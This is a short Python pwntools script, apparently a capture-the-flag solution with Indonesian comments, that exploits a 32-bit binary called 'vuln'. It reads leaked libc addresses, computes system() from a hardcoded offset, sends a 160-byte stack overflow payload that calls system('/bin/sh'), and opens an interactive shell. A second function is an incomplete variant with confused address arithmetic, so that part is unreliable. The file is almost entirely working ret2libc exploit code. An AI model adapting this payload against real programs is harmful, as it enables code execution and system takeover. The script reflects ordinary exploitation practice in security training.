from pwn import *
import re
def main_solve():
    # alamat local kali linux libc
    gdb_puts = 0xf7e23e40 # di dapet dari p puts gdb
    gdb_system = 0xf7df9870 # di dapat dari p system gdb

    # alamat soal ubuntu 16
    gdb_puts = 0xf7652140
    gdb_system = 0xf762d940

    offset = gdb_puts - gdb_system # offset dari si system
    elf = ELF("./vuln")
    r = elf.process()
    prompt = r.recv()
    print(prompt)
    puts = int(re.findall("puts: (.*)",prompt)[0],16)
    bin_sh = int(re.findall("useful_string: (.*)",prompt)[0],16)
    print "alamat puts : ",puts
    print "alamat useful_string : ",bin_sh
    system = puts - offset
    print "alamat system : ", hex(system)
    p = ""
    p += "A"*160
    p += p32(system)
    p += "ALAN"
    p += p32(bin_sh)
    r.sendline(p)
    r.interactive()


def main():
    r = process("./vuln")
    offset = 160
    r.recvuntil("puts: ")
    puts = hex(int(r.recvline().replace("\n",''),16))
    r.recvuntil("useful_string: ")
    bin_sh = hex(int(r.recvline().replace("\n",''),16))
    print " puts : ",puts
    print " /bin/sh : ",bin_sh

    #dapet dari https://libc.blukat.me/?q=puts%3A140&l=libc6-i386_2.23-0ubuntu10_amd64
    system = 0x03a940
    system = 0x618 - 0xf7df9870
    print system


    str_bin_sh = 0x15902b
    main = 0x00000803
    puts_plt = 0x00000618
    gets_glibc = 0x00002010


    p = ''
    p += "A"*offset
    p += p32(system)
    p += "AAAA"
    p += p32(bin_sh)

    r.sendline(p)
    r.interactive()

if __name__ == '__main__':
    main_solve()
